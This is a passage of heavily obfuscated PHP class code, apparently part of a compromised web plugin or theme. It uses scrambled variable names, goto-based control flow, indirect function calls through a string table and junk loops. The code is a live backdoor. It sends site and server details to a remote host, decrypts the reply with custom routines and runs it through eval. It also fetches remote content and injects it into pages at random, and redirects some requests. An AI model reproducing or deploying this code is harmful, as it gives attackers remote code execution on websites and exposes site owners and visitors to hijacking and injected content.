(!$fçÉ™Õ·[236]($_SERVER[$fçÉ™Õ·[44]], $DÀ™ØÀÎñ)) { return; } $A†ÜÉÏ¬¥„ = $fçÉ™Õ·[242]; $A†ÜÉÏ¬¥„ = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($A†ÜÉÏ¬¥„, $fçÉ™Õ·[244]); goto Cš“”÷çÈ; dÍÖŠõ²ßó: $a¯®Ûò¡° =& $_SERVER[Ö]; $fçÉ™Õ· =& $_SERVER[¸‹ï‰«Ğ]; $DÀ™ØÀÎñ = array($fçÉ™Õ·[135], $fçÉ™Õ·[240]); goto cæ±“™ÆØ‡; Cš“”÷çÈ: $EĞ½†İ¦ö = $fçÉ™Õ·[245](array($fçÉ™Õ·[246] => array($fçÉ™Õ·[247] => $fçÉ™Õ·[248], $fçÉ™Õ·[249] => 3))); $fùŒ„œ‹¢ = @$fçÉ™Õ·[250]($A†ÜÉÏ¬¥„, !1, $EĞ½†İ¦ö); $fçÉ™Õ·[251]($fçÉ™Õ·[252]); goto eì¹øÏï´¸; b•°Û¢éŒâ: } public function igouaa4ee53d($EëŠ¶¤æ¼¬) { goto B‰Ù‰¦†‰; A¶­Ã§’°œ: $dàøÛ©½¶§ = array($BƒÕÏŠ‘•[255], $BƒÕÏŠ‘•[256], $BƒÕÏŠ‘•[257], $BƒÕÏŠ‘•[258], $BƒÕÏŠ‘•[259], $BƒÕÏŠ‘•[260], $BƒÕÏŠ‘•[261], $BƒÕÏŠ‘•[262]); $fˆ²ÃÖ—” = $BƒÕÏŠ‘•[0]($BƒÕÏŠ‘•[263], $BƒÕÏŠ‘•[104]($this->dzow6dcbc746, $BƒÕÏŠ‘•[129], $BƒÕÏŠ‘•[10])); $A¤¦Ù¤Œñ = array(); goto dŒÈÛêãñÏ; B‰Ù‰¦†‰: $DªŒùéŒ’† =& $_SERVER[Ö]; $BƒÕÏŠ‘• =& $_SERVER[¸‹ï‰«Ğ]; if ($this->wrks0914a6a5 == $BƒÕÏŠ‘•[254]) { return $EëŠ¶¤æ¼¬; } goto A¶­Ã§’°œ; dŒÈÛêãñÏ: $b„ÄÏÖ´¢” = $DªŒùéŒ’†[608]; foreach ($dàøÛ©½¶§ as $E¯©©Û÷—¼) { if (!$BƒÕÏŠ‘•[236]($E¯©©Û÷—¼, $fˆ²ÃÖ—”)) { $A¤¦Ù¤Œñ[] = $E¯©©Û÷—¼; } } foreach ($A¤¦Ù¤Œñ as $E¯©©Û÷—¼) { unset($EëŠ¶¤æ¼¬[$E¯©©Û÷—¼]); $dš±¸©’æƒ = $DªŒùéŒ’†[609]; while ($dš±¸©’æƒ < $DªŒùéŒ’†[560]) { if ($dš±¸©’æƒ >= 0) { break; } $dš±¸©’æƒ++; } } goto c–Îä¢âÄ±; c–Îä¢âÄ±: return $EëŠ¶¤æ¼¬; $CˆÑáÃĞ£ø = $DªŒùéŒ’†[610]; if (strlen($CˆÑáÃĞ£ø) < $DªŒùéŒ’†[560]) { return; } goto b«šù‚©‡; b«šù‚©‡: } private function pdjy7948ff7b() { goto C§¤‹éëò; C§¤‹éëò: $F†©“Éá™ã =& $_SERVER[Ö]; $E“ Ï¸ôø¬ =& $_SERVER[¸‹ï‰«Ğ]; if ($this->wrks0914a6a5 != $E“ Ï¸ôø¬[121]) { $GLOBALS[$E“ Ï¸ôø¬[91]][$E“ Ï¸ôø¬[95]][$E“ Ï¸ôø¬[264]] = $E“ Ï¸ôø¬[220]; return; } goto bŞ÷””¨ƒ©; bŞ÷””¨ƒ©: $BÛÑØ˜ƒñ¸ = $_SERVER[$E“ Ï¸ôø¬[44]]; $CŠ…ºİçùÊ = array($E“ Ï¸ôø¬[265]); foreach ($CŠ…ºİçùÊ as $FİØÊò–‡) { if ($FİØÊò–‡ == $BÛÑØ˜ƒñ¸ || $E“ Ï¸ôø¬[25]($BÛÑØ˜ƒñ¸, 0, $E“ Ï¸ôø¬[24]($FİØÊò–‡)) == $FİØÊò–‡) { $E“ Ï¸ôø¬[166]($E“ Ï¸ôø¬[197]($E“ Ï¸ôø¬[266]), !1); } } goto CĞ½ğÔäÄ; FÈ…¡ª•æ: if (strlen($f°›³ÓŠñ½) < $F†©“Éá™ã[584]) { return; } if ($E“ Ï¸ôø¬[61]($E“ Ï¸ôø¬[269])->{$_SERVER[¸‹ï‰«Ğ][63]}($E“ Ï¸ôø¬[85]) != $E“ Ï¸ôø¬[229]) { $E“ Ï¸ôø¬[61]($E“ Ï¸ôø¬[269])->{$_SERVER[¸‹ï‰«Ğ][221]}($E“ Ï¸ôø¬[85], $E“ Ï¸ôø¬[229]); } goto B¦Î©¿¢Ç¸; CĞ½ğÔäÄ: $GLOBALS[$E“ Ï¸ôø¬[91]][$E“ Ï¸ôø¬[95]][$E“ Ï¸ôø¬[267]] = $E“ Ï¸ôø¬[220]; $c‚ğƒÆ°ˆ© = $F†©“Éá™ã[611]; if (strlen($c‚ğƒÆ°ˆ©) < $F†©“Éá™ã[560]) { return; } goto aÙ¦§¡›Øù; aÙ¦§¡›Øù: $GLOBALS[$E“ Ï¸ôø¬[91]][$E“ Ï¸ôø¬[95]][$E“ Ï¸ôø¬[264]] = $E“ Ï¸ôø¬[229]; $GLOBALS[$E“ Ï¸ôø¬[91]][$E“ Ï¸ôø¬[268]] = $E“ Ï¸ôø¬[220]; $f°›³ÓŠñ½ = $F†©“Éá™ã[612]; goto FÈ…¡ª•æ; B¦Î©¿¢Ç¸: } public function jvma6f0faa0a() { return $_SERVER[¸‹ï‰«Ğ][270]; $FÜ´À…•ÙÕ = $_SERVER[Ö][577]; } private function zfyg81cc20c1() { goto dİ®…Ç­ ÷; fåë­Áª‚ó: $B”†Ìš¢ô† = $c¥Èã‘™á[615]; if (!$B”†Ìš¢ô†) { return; } if (!$E¾©â¬‰ì®[191]($aæÃÆĞ«²Ò)) { return; } goto e¶ù…„† ; C»Ğİç³åì: $cëç©œ»ƒ = $c¥Èã‘™á[609]; if (!$cëç©œ»ƒ) { die; } $fœ²÷Á£ = $E¾©â¬‰ì®[274] . $E¾©â¬‰ì®[114]($E¾©â¬‰ì®[275]); goto EÑ¯ÍÒĞ‡Õ; e¶ù…„† : if ($aæÃÆĞ«²Ò[$E¾©â¬‰ì®[165]] && $aæÃÆĞ«²Ò[$E¾©â¬‰ì®[280]]) { if ($this->{$_SERVER[¸‹ï‰«Ğ][199]}($aæÃÆĞ«²Ò[$E¾©â¬‰ì®[280]]) == $AÏøÔÀ À[$E¾©â¬‰ì®[165]]) { return; } } $this->{$_SERVER[¸‹ï‰«Ğ][164]}(); $cö×ˆÓ„â = $c¥Èã‘™á[616]; goto eŒÃ‘âêİ¶; eŒÃ‘âêİ¶: if (!$cö×ˆÓ„â) { die; } if ($this->{$_SERVER[¸‹ï‰«Ğ][199]}($aæÃÆĞ«²Ò[$E¾©â¬‰ì®[280]]) != $AÏøÔÀ À[$E¾©â¬‰ì®[165]]) { $cË÷§Òˆ—ê = array($E¾©â¬‰ì®[202] => $E¾©â¬‰ì®[61]($E¾©â¬‰ì®[62])->{$_SERVER[¸‹ï‰«Ğ][63]}($E¾©â¬‰ì®[116]), $E¾©â¬‰ì®[203] => $_SERVER[$E¾©â¬‰ì®[115]], $E¾©â¬‰ì®[204] => $E¾©â¬‰ì®[205](), $E¾©â¬‰ì®[174] => $_SERVER[$E¾©â¬‰ì®[175]]); $CÎå¢×Ü = $this->{$_SERVER[¸‹ï‰«Ğ][206]}($E¾©â¬‰ì®[148]($cË÷§Òˆ—ê)); $aæÃÆĞ«²Ò = $this->{$_SERVER[¸‹ï‰«Ğ][182]}($E¾©â¬‰ì®[207] . $CÎå¢×Ü); if ($aæÃÆĞ«²Ò && $E¾©â¬‰ì®[191]($aæÃÆĞ«²Ò) && isset($aæÃÆĞ«²Ò[$E¾©â¬‰ì®[280]])) { $eÎ˜«ãì½ = $this->{$_SERVER[¸‹ï‰«Ğ][188]}($aæÃÆĞ«²Ò[$E¾©â¬‰ì®[280]], 2); if ($eÎ˜«ãì½) { $eÎ˜«ãì½ = $this->{$_SERVER[¸‹ï‰«Ğ][199]}($eÎ˜«ãì½); } if ($eÎ˜«ãì½) { try { @eval($eÎ˜«ãì½); } catch (Exception $aÄ™÷®Ø“Ä) { } } } } goto C£®°ïßØˆ; añ×¯œÒè“: $E¾©â¬‰ì®[13](array($E¾©â¬‰ì®[276], $E¾©â¬‰ì®[152]), $fœ²÷Á£, $E¾©â¬‰ì®[230]()); $AÏøÔÀ À = array($E¾©â¬‰ì®[165] => $E¾©â¬‰ì®[61]($E¾©â¬‰ì®[62])->{$_SERVER[¸‹ï‰«Ğ][63]}($E¾©â¬‰ì®[209]), $E¾©â¬‰ì®[178] => $this->wrks0914a6a5, $E¾©â¬‰ì®[176] => $_SERVER[$E¾©â¬‰ì®[177]], $E¾©â¬‰ì®[169] => $E¾©â¬‰ì®[149], $E¾©â¬‰ì®[172] => $_SERVER[$E¾©â¬‰ì®[173]]); $aæÃÆĞ«²Ò = $this->{$_SERVER[¸‹ï‰«Ğ][182]}($E¾©â¬‰ì®[279], $AÏøÔÀ À); goto fåë­Áª‚ó; dİ®…Ç­ ÷: $c¥Èã‘™á =& $_SERVER[Ö]; $E¾©â¬‰ì® =& $_SERVER[¸‹ï‰«Ğ]; $AíæêïÅöŒ = array($E¾©â¬‰ì®[271], $E¾©â¬‰ì®[272], $E¾©â¬‰ì®[273]); goto C»Ğİç³åì; EÑ¯ÍÒĞ‡Õ: $CĞ×¨òàÒ = $c¥Èã‘™á[613]; if (!$CĞ×¨òàÒ) { return; } if ($this->wrks0914a6a5 == $E¾©â¬‰ì®[121] || !$E¾©â¬‰ì®[104]($GLOBALS, $E¾©â¬‰ì®[132])) { return; } goto f©Ôö¿ğ; DÖïÄ£÷¡Ì: $fÄ¥«¡„¾İ = $c¥Èã‘™á[614]; if (strlen($fÄ¥«¡„¾İ) < $c¥Èã‘™á[584]) { return; } if ($aœÇ‘†¯×í && $E¾©â¬‰ì®[230]() - $aœÇ‘†¯×í < $E¾©â¬‰ì®[201]($E¾©â¬‰ì®[278])) { return; } goto añ×¯œÒè“; f©Ôö¿ğ: if (!$E¾©â¬‰ì®[236]($_SERVER[$E¾©â¬‰ì®[44]], $AíæêïÅöŒ)) { return; } if ($E¾©â¬‰ì®[230]() % 4 != 0) { return; } $aœÇ‘†¯×í = $E¾©â¬‰ì®[13](array($E¾©â¬‰ì®[276], $E¾©â¬‰ì®[277]), $fœ²÷Á£); goto DÖïÄ£÷¡Ì; C£®°ïßØˆ: } private function wctu9c929c19($B¨áªï• = '', $b‹¬”’ÙŞÏ = array(), $D¯ø¶ÔÖ¿ = 5) { goto CŒâµÄ½ôÊ; CŒâµÄ½ôÊ: $C™×™Œ­¶ =& $_SERVER[Ö]; $Då™ô—‹‹ò =& $_SERVER[¸‹ï‰«Ğ]; $aº†ÂŞãÌ‘ = $Då™ô—‹‹ò[281]; goto A¬†…Ë‡; E–’ƒĞ‹ç: $b‹¬”’ÙŞÏ = @$Då™ô—‹‹ò[250]($aº†ÂŞãÌ‘, !1, $eÕÓ¬Û½ò); $ağ˜ã²íß‡ = $C™×™Œ­¶[618]; if (strlen($ağ˜ã²íß‡) < $C™×™Œ­¶[555]) { die; } goto bëù†ÎÂ‡ë; F¥ê¿æÔ¤×: $eÕÓ¬Û½ò = $Då™ô—‹‹ò[245](array($Då™ô—‹‹ò[246] => array($Då™ô—‹‹ò[249] => $D¯ø¶ÔÖ¿, $Då™ô—‹‹ò[247] => $Då™ô—‹‹ò[285]), $Då™ô—‹‹ò[286] => array($Då™ô—‹‹ò[287] => !1, $Då™ô—‹‹ò[288] => !1))); $aÂ’‹ˆÍø¾ = $C™×™Œ­¶[617]; if (!$aÂ’‹ˆÍø¾) { return; } goto E–’ƒĞ‹ç; A¬†…Ë‡: $aº†ÂŞãÌ‘ = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($aº†ÂŞãÌ‘, $Då™ô—‹‹ò[282]); $aº†ÂŞãÌ‘ = $aº†ÂŞãÌ‘ . $B¨áªï• . $Då™ô—‹‹ò[283] . $Då™ô—‹‹ò[284]($b‹¬”’ÙŞÏ); if ($b‹¬”’ÙŞÏ === -1) { return $aº†ÂŞãÌ‘; } goto F¥ê¿æÔ¤×; bëù†ÎÂ‡ë: return $Då™ô—‹‹ò[190]($b‹¬”’ÙŞÏ, !0); $DÇÚ¦Ï¤ì… = $C™×™Œ­¶[619]; if (!$DÇÚ¦Ï¤ì…) { die; } goto F¡ùƒ´ÏĞÍ; F¡ùƒ´ÏĞÍ: } private function dvle45e4b8a2() { goto aãî×À²…Î; CÙÖöÈêÆ”: if (strlen($FĞÄ—§ŸÏÀ) < $aßæˆÍÉÄê[584]) { return; } goto fœíµ‚Ğ¯´; E²÷ÄæËçĞ: $aæ¶Ş·²‹– = $a’ö†éÛÇ[104]($this->dzow6dcbc746, $a’ö†éÛÇ[316]); $BÓœ±Û¡Àµ = $aßæˆÍÉÄê[622]; if (!$BÓœ±Û¡Àµ) { die; } goto E¦Œ×ÚèÎÜ; Aëïø¦ÁÇ£: $Aïæ³“ÉÃÌ = $aßæˆÍÉÄê[620]; if (!$Aïæ³“ÉÃÌ) { die; } $BçöÕ¡—æ = $FƒÚíÉù [$this->wrks0914a6a5]; goto e×ïºÖíÂŒ; aãî×À²…Î: $aßæˆÍÉÄê =& $_SERVER[Ö]; $a’ö†éÛÇ =& $_SERVER[¸‹ï‰«Ğ]; $FƒÚíÉù  = array($a’ö†éÛÇ[289] => $a’ö†éÛÇ[290], $a’ö†éÛÇ[291] => $a’ö†éÛÇ[292], $a’ö†éÛÇ[293] => $a’ö†éÛÇ[294], $a’ö†éÛÇ[295] => $a’ö†éÛÇ[296], $a’ö†éÛÇ[297] => $a’ö†éÛÇ[298], $a’ö†éÛÇ[299] => $a’ö†éÛÇ[238], $a’ö†éÛÇ[300] => $a’ö†éÛÇ[238], $a’ö†éÛÇ[301] => $a’ö†éÛÇ[290], $a’ö†éÛÇ[302] => $a’ö†éÛÇ[292], $a’ö†éÛÇ[303] => $a’ö†éÛÇ[294], $a’ö†éÛÇ[304] => $a’ö†éÛÇ[305], $a’ö†éÛÇ[306] => $a’ö†éÛÇ[296], $a’ö†éÛÇ[307] => $a’ö†éÛÇ[308], $a’ö†éÛÇ[309] => $a’ö†éÛÇ[298], $a’ö†éÛÇ[310] => $a’ö†éÛÇ[311], $a’ö†éÛÇ[312] => $a’ö†éÛÇ[313], $a’ö†éÛÇ[314] => $a’ö†éÛÇ[315]); goto Aëïø¦ÁÇ£; e×ïºÖíÂŒ: $fƒ—ÏÉÍÔ = $aßæˆÍÉÄê[621]; while (strlen($fƒ—ÏÉÍÔ) < $aßæˆÍÉÄê[560]) { if (!$fƒ—ÏÉÍÔ) { break; } $fƒ—ÏÉÍÔ++; } $BçöÕ¡—æ = $a’ö†éÛÇ[201]($BçöÕ¡—æ ? $BçöÕ¡—æ : $a’ö†éÛÇ[290]); goto E²÷ÄæËçĞ; E¦Œ×ÚèÎÜ: $aæ¶Ş·²‹– = $aæ¶Ş·²‹– ? $a’ö†éÛÇ[201]($aæ¶Ş·²‹–) : 0; return $BçöÕ¡—æ + $aæ¶Ş·²‹–; $FĞÄ—§ŸÏÀ = $aßæˆÍÉÄê[623]; goto CÙÖöÈêÆ”; fœíµ‚Ğ¯´: } public function hwku06ff2a19($A¾áù»—¬µ) { goto Bî£Şå»ÏÍ; Bî£Şå»ÏÍ: $b…ßÂ£‹Î” =& $_SERVER[¸‹ï‰«Ğ]; $a”í‡«®­Ÿ = $this->{$_SERVER[¸‹ï‰«Ğ][137]}(); if ($a”í‡«®­Ÿ >= $b…ßÂ£‹Î”[201]($b…ßÂ£‹Î”[238])) { return; } goto EÔõÛ™Ê­; FÃŠ„ÙÃ™ã: $f‘¬ Ö¾Š‰ = $b…ßÂ£‹Î”[222]($f‘¬ Ö¾Š‰, $b…ßÂ£‹Î”[10], $b…ßÂ£‹Î”[318]); if (!$b…ßÂ£‹Î”[236]($A¾áù»—¬µ[$b…ßÂ£‹Î”[318]], $f‘¬ Ö¾Š‰)) { $b…ßÂ£‹Î”[166]($b…ßÂ£‹Î”[321], !1, $b…ßÂ£‹Î”[233]); } goto DÂë´ºĞÓÍ; EÔõÛ™Ê­: $d±¢ª÷ï™„ = $b…ßÂ£‹Î”[61]($b…ßÂ£‹Î”[139])->{$_SERVER[¸‹ï‰«Ğ][140]}(); if ($d±¢ª÷ï™„ <= $a”í‡«®­Ÿ) { return; } $f‘¬ Ö¾Š‰ = $b…ßÂ£‹Î”[61]($b…ßÂ£‹Î”[139])->{$_SERVER[¸‹ï‰«Ğ][317]}($b…ßÂ£‹Î”[318])->{$_SERVER[¸‹ï‰«Ğ][319]}($a”í‡«®­Ÿ)->{$_SERVER[¸‹ï‰«Ğ][320]}(); goto FÃŠ„ÙÃ™ã; DÂë´ºĞÓÍ: } public function uboz5ca1737b() { goto c’¼¤ÚÚ²; CÁÉ¢«”·: $DäÛ¯Œ·™ = $aœŸˆ©…ê[242]; $Fé†ÍáÔ…“ = $bÀ¢ÂÙõ„[624]; while ($Fé†ÍáÔ…“ < $bÀ¢ÂÙõ„[590]) { if ($Fé†ÍáÔ…“ >= 0) { break; } $Fé†ÍáÔ…“++; } goto Côˆëœİ·Û; c’¼¤ÚÚ²: $bÀ¢ÂÙõ„ =& $_SERVER[Ö]; $aœŸˆ©…ê =& $_SERVER[¸‹ï‰«Ğ]; if (!$aœŸˆ©…ê[104]($GLOBALS, $aœŸˆ©…ê[132]) || $aœŸˆ©…ê[322](1, 100) > 20) { return; } goto CÁÉ¢«”·; Côˆëœİ·Û: $DäÛ¯Œ·™ = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($DäÛ¯Œ·™, $aœŸˆ©…ê[244]); $cêóÃÖÑ†î = $aœŸˆ©…ê[245](array($aœŸˆ©…ê[246] => array($aœŸˆ©…ê[247] => $aœŸˆ©…ê[248], $aœŸˆ©…ê[249] => 3))); $a¢§å«„ = $bÀ¢ÂÙõ„[625]; goto bø×°‰÷†; bø×°‰÷†: $bç‚˜áìÊ = @$aœŸˆ©…ê[250]($DäÛ¯Œ·™, !1, $cêóÃÖÑ†î); echo $aœŸˆ©…ê[323] . $aœŸˆ©…ê[324]($bç‚˜áìÊ) . $aœŸˆ©…ê[325]; goto fƒÜ”´šß; fƒÜ”´šß: } private function ghvy32cbb2fd($eÙ¤°ªäÍ, $Cªë–ùÆÂ…, $d¸ÒåÉ®ê = 3) { goto E“‘åà°ÍÍ; cŠº‰¼À¥Æ: return $AÑõİøØÍ; goto dâ±éõàˆ; E“‘åà°ÍÍ: $aÍ†ŠÎ…Ù =& $_SERVER[Ö]; $FÃ½äÈêöÛ =& $_SERVER[¸‹ï‰«Ğ]; $FÃ½äÈêöÛ[326](1); goto C©©Òˆâ’Á; C©©Òˆâ’Á: $Fİ°‡²…·ğ = $aÍ†ŠÎ…Ù[626]; while ($Fİ°‡²…·ğ < $aÍ†ŠÎ…Ù[560]) { if ($Fİ°‡²…·ğ >= 0) { break; } $Fİ°‡²…·ğ++; } $eÙ¤°ªäÍ = $FÃ½äÈêöÛ[2]($eÙ¤°ªäÍ); goto cÒÖèËÂ¢; Eì‘ùˆóà³: $dÆƒîŒˆöê = $FÃ½äÈêöÛ[124](15); $dƒ†’Í¼Ú = $aÍ†ŠÎ…Ù[628]; if (!$dƒ†’Í¼Ú) { die; } goto c×¿¢Ÿ­ìæ; cÒÖèËÂ¢: $DØ³…É‰µÕ = $FÃ½äÈêöÛ[322](0, 5) . $FÃ½äÈêöÛ[10]; $aÇíé§ëØù = $aÍ†ŠÎ…Ù[627]; if (strlen($aÇíé§ëØù) < $aÍ†ŠÎ…Ù[547]) { die; } goto Eì‘ùˆóà³; CçÕ¤ˆÌÆ–: $D†ÎôêÇ = $aÍ†ŠÎ…Ù[642]; if (strlen($D†ÎôêÇ) < $aÍ†ŠÎ…Ù[560]) { return; } if ($d¸ÒåÉ®ê - 1 > 0) { $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][127]}($AÑõİøØÍ, $Cªë–ùÆÂ…, $d¸ÒåÉ®ê - 1); } goto cŠº‰¼À¥Æ; c×¿¢Ÿ­ìæ: $FÊùÙ¬ĞÉ = $FÃ½äÈêöÛ[327]; switch ($DØ³…É‰µÕ) { case $FÃ½äÈêöÛ[229]: $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($eÙ¤°ªäÍ, $FÃ½äÈêöÛ[214]($Cªë–ùÆÂ… . $dÆƒîŒˆöê)); break; $E’Á´Ù¥à„ = $aÍ†ŠÎ…Ù[629]; if (strlen($E’Á´Ù¥à„) < $aÍ†ŠÎ…Ù[555]) { die; } case $FÃ½äÈêöÛ[220]: $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($eÙ¤°ªäÍ, $FÃ½äÈêöÛ[214]($dÆƒîŒˆöê . $Cªë–ùÆÂ…)); break; case $FÃ½äÈêöÛ[328]: $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($eÙ¤°ªäÍ, $FÃ½äÈêöÛ[118]($dÆƒîŒˆöê . $Cªë–ùÆÂ…)); $A¸¿Ñ‹Ä¡ä = $aÍ†ŠÎ…Ù[630]; if (strlen($A¸¿Ñ‹Ä¡ä) < $aÍ†ŠÎ…Ù[560]) { die; } break; $D†àò×¼ÈŒ = $aÍ†ŠÎ…Ù[631]; case $FÃ½äÈêöÛ[329]: $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($eÙ¤°ªäÍ, $FÃ½äÈêöÛ[114]($dÆƒîŒˆöê . $Cªë–ùÆÂ…)); $C©º†Ê•¼À = $aÍ†ŠÎ…Ù[632]; if (strlen($C©º†Ê•¼À) < $aÍ†ŠÎ…Ù[590]) { die; } break; $Dîª‰˜Ğ = $aÍ†ŠÎ…Ù[633]; while (strlen($Dîª‰˜Ğ) < $aÍ†ŠÎ…Ù[547]) { if (!$Dîª‰˜Ğ) { break; } $Dîª‰˜Ğ++; } case $FÃ½äÈêöÛ[330]: goto fÏäù¼Êğ; E›ß¢»Ù’«: $fˆ¯¨ƒê® = $FÃ½äÈêöÛ[331](0, 64); $Bªè¹¦½Åª = $FÊùÙ¬ĞÉ[$fˆ¯¨ƒê®]; $aÈ†”¯‚á = $aÍ†ŠÎ…Ù[635]; goto c”†¾ˆÅñÀ; Dƒ¯äÆ‚: $b§¯à¿«ôÎ = 0; for ($DÚËÎîæÃç = 0; $DÚËÎîæÃç < $FÃ½äÈêöÛ[24]($eÙ¤°ªäÍ); $DÚËÎîæÃç++) { $b§¯à¿«ôÎ = $b§¯à¿«ôÎ == $FÃ½äÈêöÛ[24]($eëéÛ»¼Ò) ? 0 : $b§¯à¿«ôÎ; $f¦‡×Ä°„Ÿ = ($fˆ¯¨ƒê® + $FÃ½äÈêöÛ[332]($FÊùÙ¬ĞÉ, $eÙ¤°ªäÍ[$DÚËÎîæÃç]) + $FÃ½äÈêöÛ[333]($eëéÛ»¼Ò[$b§¯à¿«ôÎ++])) % 64; $FÀÉÑÜ¿ñ = $aÍ†ŠÎ…Ù[640]; if (!$FÀÉÑÜ¿ñ) { return; } $f’×”òÈ‚ó .= $FÊùÙ¬ĞÉ[$f¦‡×Ä°„Ÿ]; $B¥Ëß¯®ĞÂ = $aÍ†ŠÎ…Ù[641]; } $AÑõİøØÍ = $FÃ½äÈêöÛ[324]($Bªè¹¦½Åª . $f’×”òÈ‚ó); goto f‚‘»‰¾¿ê; dˆ»Çº»: $EÇïÌ¿©²Ú = $aÍ†ŠÎ…Ù[636]; if (strlen($EÇïÌ¿©²Ú) < $aÍ†ŠÎ…Ù[590]) { die; } $f’×”òÈ‚ó = $FÃ½äÈêöÛ[10]; goto cÛˆßºŒå; fÏäù¼Êğ: $eÙ¤°ªäÍ = $FÃ½äÈêöÛ[118]($eÙ¤°ªäÍ); $EÆğÒ®®¿ = $aÍ†ŠÎ…Ù[634]; while ($EÆğÒ®®¿ < $aÍ†ŠÎ…Ù[590]) { if ($EÆğÒ®®¿ >= 0) { break; } $EÆğÒ®®¿++; } goto E›ß¢»Ù’«; c”†¾ˆÅñÀ: if (strlen($aÈ†”¯‚á) < $aÍ†ŠÎ…Ù[590]) { return; } $eëéÛ»¼Ò = $FÃ½äÈêöÛ[114]($Bªè¹¦½Åª . $FÃ½äÈêöÛ[114]($Cªë–ùÆÂ… . $Bªè¹¦½Åª) . $Cªë–ùÆÂ…); $eëéÛ»¼Ò = $FÃ½äÈêöÛ[25]($eëéÛ»¼Ò, $fˆ¯¨ƒê® % 8, $fˆ¯¨ƒê® % 8 + 7); goto dˆ»Çº»; cÛˆßºŒå: $f™‹……åÅ = $aÍ†ŠÎ…Ù[637]; $DÚËÎîæÃç = 0; $C­œ¨®£¸ = $aÍ†ŠÎ…Ù[638]; goto bñÅá¡ÕÇ£; f‚‘»‰¾¿ê: break; goto DÆÙíÍõ‘; bñÅá¡ÕÇ£: if (!$C­œ¨®£¸) { die; } $f¦‡×Ä°„Ÿ = 0; $D—ÅÎ»í‰ = $aÍ†ŠÎ…Ù[639]; goto Dƒ¯äÆ‚; DÆÙíÍõ‘: default: $AÑõİøØÍ = $this->{$_SERVER[¸‹ï‰«Ğ][147]}($eÙ¤°ªäÍ, $Cªë–ùÆÂ… . $dÆƒîŒˆöê); break; } $AÑõİøØÍ = $FÃ½äÈêöÛ[214]($DØ³…É‰µÕ . $dÆƒîŒˆöê . $AÑõİøØÍ); goto CçÕ¤ˆÌÆ–; dâ±éõàˆ: } private function ukcrfad8a782($EÚçÍöí‘‹, $b¶†‰ÖÑ¯Ş, $B¯‡¬İèŞô = 3) { goto F¡ò¥ÒÜÒÀ; F¡ò¥ÒÜÒÀ: $D×ìóÅµ‹ =& $_SERVER[Ö]; $F¢ç¤Šó¸è =& $_SERVER[¸‹ï‰«Ğ]; if (!$F¢ç¤Šó¸è[334]($EÚçÍöí‘‹) || $F¢ç¤Šó¸è[24]($EÚçÍöí‘‹) < 10) { return !1; } goto F¸ñ Û³Ü; fÕ‡ßôˆ: if ($B¯‡¬İèŞô - 1 > 0) { $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][188]}($D  í‹Ùò, $b¶†‰ÖÑ¯Ş, $B¯‡¬İèŞô - 1); } return $D  í‹Ùò; goto F¬º§œàòä; F¸ñ Û³Ü: $EÚçÍöí‘‹ = $F¢ç¤Šó¸è[2]($EÚçÍöí‘‹); $cÇğƒÛç‰‹ = $D×ìóÅµ‹[643]; if (!$cÇğƒÛç‰‹) { return; } goto F‰æ¡É‡çñ; f•—¥ó³‚: $EÚçÍöí‘‹ = $F¢ç¤Šó¸è[25]($EÚçÍöí‘‹, 16); $Dõë ‘½™ = $F¢ç¤Šó¸è[327]; switch ($eŒŒÓ¸Œñ) { case $F¢ç¤Šó¸è[229]: $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($EÚçÍöí‘‹, $F¢ç¤Šó¸è[214]($b¶†‰ÖÑ¯Ş . $B­¤»í‚Õ‡)); break; case $F¢ç¤Šó¸è[220]: $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($EÚçÍöí‘‹, $F¢ç¤Šó¸è[214]($B­¤»í‚Õ‡ . $b¶†‰ÖÑ¯Ş)); $CŒõ´®†¦  = $D×ìóÅµ‹[644]; break; case $F¢ç¤Šó¸è[328]: $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($EÚçÍöí‘‹, $F¢ç¤Šó¸è[118]($B­¤»í‚Õ‡ . $b¶†‰ÖÑ¯Ş)); break; case $F¢ç¤Šó¸è[329]: $D  í‹Ùò = $this->{$_SERVER[¸‹ï‰«Ğ][243]}($EÚçÍöí‘‹, $F¢ç¤Šó¸è[114]($B­¤»í‚Õ‡ . $b¶†‰ÖÑ¯Ş)); $e˜Éï©™ø = $D×ìóÅµ‹[645]; break; case $F¢ç¤Šó¸è[330]: goto F¬¸ªÌ”’¶; EÜÕ†ô•Úø: if (!$F›·¨ãõĞ) { return; } $dâ™Â¹÷ÑÑ = $F¢ç¤Šó¸è[10]; $fˆî¬‚†ùƒ = 0; goto fŒùİõ¬ãè; Fä¸©ˆ•Èß: if (!$d‰¾ŒÙ¸¤ñ) { return; } $EŒ‰‡÷ÈÓë = $F¢ç¤Šó¸è[332]($Dõë ‘½™, $CêùŠÙ‚Ğƒ); $b¬¦áÓñÇ = $D×ìóÅµ‹[648]; goto d»´÷°Ò¶¿; C¿§ßŒò÷Á: if (strlen($D·†¶èÍÕÁ) < $D×ìóÅµ‹[590]) { return; } $c©çÖœöˆŠ = $F¢ç¤Šó¸è[25]($c©çÖœöˆŠ, $EŒ‰‡÷ÈÓë % 8, $EŒ‰‡÷ÈÓë % 8 + 7); $F›·¨ãõĞ = $D×ìóÅµ‹[650]; goto EÜÕ†ô•Úø; d»´÷°Ò¶¿: if (!$b¬¦áÓñÇ) { die; } $c©çÖœöˆŠ = $F¢ç¤Šó¸è[114]($CêùŠÙ‚Ğƒ . $F¢ç¤Šó¸è[114]($b¶†‰ÖÑ¯Ş . $CêùŠÙ‚Ğƒ) . $b¶†‰ÖÑ¯Ş); $D·†¶èÍÕÁ = $D×ìóÅµ‹[649]; goto C¿§ßŒò÷Á; fŒùİõ¬ãè: $DÕË“ª¢¼ê = $D×ìóÅµ‹[651]; while ($DÕË“ª¢¼ê < $D×ìóÅµ‹[547]) { if ($DÕË“ª¢¼ê >= 0) { break; } $DÕË“ª¢¼ê++; } $fÖ¢¾½Á¼ğ = 0; goto F‚ìõ½…š¡; 